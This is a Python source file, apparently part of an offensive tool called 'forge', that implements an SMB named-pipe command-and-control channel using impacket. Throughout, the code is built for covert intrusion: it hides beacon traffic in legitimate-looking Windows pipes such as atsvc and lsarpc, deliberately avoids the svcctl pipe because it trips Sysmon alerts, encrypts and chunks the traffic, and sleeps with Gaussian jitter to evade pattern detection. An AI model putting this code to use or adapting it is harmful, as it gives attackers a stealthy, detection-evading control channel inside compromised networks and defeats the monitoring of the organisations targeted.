"""
forge/utils/post/channels/smb_channel.py
SMB Named Pipe C2 channel backend — Module 5-G.

Data transport via SMB named pipes. Pipe names drawn from Phase 0 LOLBin DB
to mimic legitimate Windows inter-process communication.

OPSEC constraints:
  - Pipe names from `lolbas_pipe_names` table only; never operator-supplied names.
  - Permitted pipes: atsvc, winreg, lsarpc, browser, netlogon.
  - BANNED pipe: svcctl — generates Sysmon Event ID 18 alerts universally.
  - AES-256-GCM encrypts all pipe data before write.
  - Requires impacket; degrades gracefully to no-op if unavailable.
  - FORGE_OFFLINE_STRICT=1 disables all connections.
  - Connection timeout and retry logic with exponential backoff.
  - Payload chunking for large data transfers (max 4096 bytes per transaction).
  - Authentication fallback for different SMB versions (2.1, 3.0, 3.1.1).
"""
from __future__ import annotations

import logging
import os
import random
import sqlite3
import time
from pathlib import Path
from typing import Optional, Tuple
from forge.db.direct_connect import direct_connect  # noqa: E402  # PRAGMA-configured wrapper for bare sqlite3.connect

_LOG = logging.getLogger(__name__)
try:
    from impacket.smbconnection import SMBConnection
except ImportError:
    SMBConnection = None

# Permitted pipe names (low-scrutiny, legitimate IPC pipes)
_ALLOWED_PIPES: list[str] = [
    "atsvc",    # Task Scheduler RPC — preferred
    "winreg",   # Remote Registry RPC — preferred
    "lsarpc",   # Local Security Authority
    "browser",  # Computer Browser (legacy but still seen)
    "netlogon", # Netlogon service
]

_BANNED_PIPES: frozenset[str] = frozenset({"svcctl", "ROUTER", "epmapper"})

# SMB protocol versions for fallback
_SMB_VERSIONS: list[str] = ["2.1", "3.0", "3.1.1"]
_MAX_CHUNK_SIZE = 4096  # Maximum payload chunk size for large transfers
_MAX_RETRIES = 3       # Maximum retry attempts for connection failures
_INITIAL_RETRY_DELAY = 5  # Initial retry delay in seconds


def _offline_strict() -> bool:
    """Return the current offline-mode setting without caching import-time env."""
    return os.getenv("FORGE_OFFLINE_STRICT", "").lower() in ("1", "true", "yes")


def _get_pipe_name(kb_db: Optional[Path] = None) -> str:
    """
    Return a legitimate pipe name from Phase 0 KB if available,
    falling back to the _ALLOWED_PIPES list.
    """
    if kb_db and kb_db.exists():
        try:
            con = direct_connect(f"file:{kb_db}?mode=ro", uri=True)
            row = con.execute(
                "SELECT name FROM lolbas_pipe_names ORDER BY RANDOM() LIMIT 1"
            ).fetchone()
            con.close()
            if row and row[0] not in _BANNED_PIPES:
                return row[0]
        except sqlite3.OperationalError:
            pass
    return random.choice(_ALLOWED_PIPES)


def _exponential_backoff(attempt: int, base_delay: float = _INITIAL_RETRY_DELAY) -> float:
    """Calculate exponential backoff delay with jitter."""
    delay = base_delay * (2 ** attempt)
    jitter = random.uniform(0.5, 1.5)
    return delay * jitter


class SMBChannel:
    """
    SMB named pipe C2 channel via impacket.

    Args:
        target:      Target host IP or FQDN.
        username:    SMB username.
        password:    SMB password (or empty for Kerberos/NTLM hash auth).
        domain:      Windows domain.
        session_key: 32-byte AES-256-GCM key (hex).
        kb_db:       Phase 0 KB path for pipe name selection.
        interval:    Base beacon interval seconds.
        fallback_timeout: Timeout for fallback attempts (seconds).
    """

    def __init__(
        self,
        target:      str,
        username:    str           = "",
        password:    str           = "",
        domain:      str           = "",
        session_key: str           = "REPLACE_BEFORE_DEPLOY_32_BYTE_KEY",
        kb_db:       Optional[Path] = None,
        interval:    int           = 60,
        jitter_pct:  int           = 20,
        fallback_timeout: int       = 30,
    ) -> None:
        self._target      = target
        self._username    = username
        self._password    = password
        self._domain      = domain
        self._key         = bytes.fromhex(session_key) if len(session_key) == 64 else None
        self._pipe_name   = _get_pipe_name(kb_db)
        self._interval    = interval
        self._jitter_pct  = jitter_pct
        self._fallback_timeout = fallback_timeout
        self._connection_cache: Optional[Tuple[object, object, object]] = None  # (conn, tid, fid)
        _LOG.debug("SMBChannel: pipe=\\\\%s\\pipe\\%s", target, self._pipe_name)

    def _connect_with_fallback(self) -> Optional[Tuple[object, object, object]]:
        """
        Establish SMB connection with protocol version fallback.
        Returns (conn, tid, fid) tuple or None on failure.
        """
        if _offline_strict():
            return None
            
        if SMBConnection is None:
            _LOG.warning("impacket not installed; SMBChannel disabled.")
            return None

        # Try each SMB protocol version
        for smb_version in _SMB_VERSIONS:
            for attempt in range(_MAX_RETRIES):
                try:
                    conn = SMBConnection(self._target, self._target)
                    
                    # Set SMB dialect if supported
                    if hasattr(conn, 'setDialect'):
                        dialect_map = {
                            "2.1": 0x0210,
                            "3.0": 0x0300, 
                            "3.1.1": 0x0311
                        }
                        if smb_version in dialect_map:
                            conn.setDialect(dialect_map[smb_version])
                    
                    conn.login(self._username, self._password, self._domain)
                    tid = conn.connectTree("IPC$")
                    fid = conn.openFile(
                        tid, f"\\{self._pipe_name}",
                        desiredAccess=0x12019F,  # FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE
                        shareMode=0x3,
                        creationOption=0,
                        creationDisposition=0x1,  # OPEN_EXISTING
                        fileAttributes=0x80,  # NORMAL
                    )
                    _LOG.debug("SMBChannel: connected with %s (attempt %d)", smb_version, attempt + 1)
                    return (conn, tid, fid)
                    
                except Exception as exc:
                    _LOG.debug("SMB connection attempt %d with %s failed: %s", attempt + 1, smb_version, exc)
                    if attempt < _MAX_RETRIES - 1:
                        delay = _exponential_backoff(attempt)
                        _LOG.debug("Retrying in %.1f seconds...", delay)
                        time.sleep(delay)
                    else:
                        _LOG.warning("SMB connection failed with %s after %d attempts", smb_version, _MAX_RETRIES)
        
        return None

    def send(self, data: bytes) -> bool:
        """Send data with chunking support for large payloads."""
        if _offline_strict():
            return False
            
        encrypted = self._encrypt(data)
        
        # Chunk large payloads
        chunks = [encrypted[i:i + _MAX_CHUNK_SIZE] for i in range(0, len(encrypted), _MAX_CHUNK_SIZE)]
        
        # Use cached connection or establish new one
        conn_info = self._connection_cache or self._connect_with_fallback()
        if not conn_info:
            return False
            
        conn, tid, fid = conn_info
        success = True
        
        try:
            for i, chunk in enumerate(chunks):
                try:
                    conn.writeFile(tid, fid, chunk)
                    _LOG.debug("SMBChannel: sent chunk %d/%d (%d bytes)", i + 1, len(chunks), len(chunk))
                    
                    # Small delay between chunks to avoid overwhelming the pipe
                    if i < len(chunks) - 1:
                        time.sleep(0.1)
                        
                except Exception as exc:
                    _LOG.debug("SMB chunk %d send error: %s", i, exc)
                    success = False
                    break
                    
        finally:
            # Don't close connection immediately - cache it for next operation
            self._connection_cache = conn_info if success else None
            
        return success

    def recv(self, timeout: int = 30) -> Optional[bytes]:
        """Receive data with timeout and reassembly support."""
        if _offline_strict():
            return None
            
        # Use cached connection or establish new one
        conn_info = self._connection_cache or self._connect_with_fallback()
        if not conn_info:
            return None
            
        conn, tid, fid = conn_info
        fragments = []
        deadline = time.monotonic() + timeout
        
        try:
            while time.monotonic() < deadline:
                try:
                    # Read available data
                    data = conn.readFile(tid, fid, 0, _MAX_CHUNK_SIZE)
                    if data:
                        fragments.append(data)
                        _LOG.debug("SMBChannel: received fragment (%d bytes)", len(data))
                        
                        # Check if more data is immediately available
                        if len(data) == _MAX_CHUNK_SIZE:
                            continue
                        else:
                            break
                    else:
                        break
                        
                except Exception as exc:
                    _LOG.debug("SMB recv error: %s", exc)
                    break
                    
        finally:
            # Cache connection for reuse
            self._connection_cache = conn_info
            
        if not fragments:
            return None
            
        assembled = b"".join(fragments)
        return self._decrypt(assembled) if assembled else None

    def sleep(self) -> None:
        """Sleep with gaussian jitter to avoid detectable patterns."""
        sigma  = self._interval * (self._jitter_pct / 100)
        actual = max(5.0, random.gauss(self._interval, sigma))
        _LOG.debug("SMBChannel: sleeping for %.1f seconds", actual)
        time.sleep(actual)

    def close(self) -> None:
        """Close cached connection and cleanup resources."""
        if self._connection_cache:
            conn, tid, fid = self._connection_cache
            try:
                conn.closeFile(tid, fid)
                conn.disconnectTree(tid)
                conn.logoff()
                _LOG.debug("SMBChannel: connection closed")
            except Exception as exc:
                _LOG.debug("SMB close error: %s", exc)
            finally:
                self._connection_cache = None

    def _encrypt(self, data: bytes) -> bytes:
        """Encrypt data using AES-256-GCM."""
        if not self._key:
            return data
        try:
            from Crypto.Cipher import AES
            from Crypto.Random import get_random_bytes
            nonce  = get_random_bytes(12)
            cipher = AES.new(self._key, AES.MODE_GCM, nonce=nonce)
            ct, tag = cipher.encrypt_and_digest(data)
            return nonce + tag + ct
        except ImportError:
            return data

    def _decrypt(self, raw: bytes) -> Optional[bytes]:
        """Decrypt data using AES-256-GCM."""
        if not self._key or len(raw) < 28:
            return raw
        try:
            from Crypto.Cipher import AES
            nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
            cipher = AES.new(self._key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ct, tag)
        except Exception:
            return None
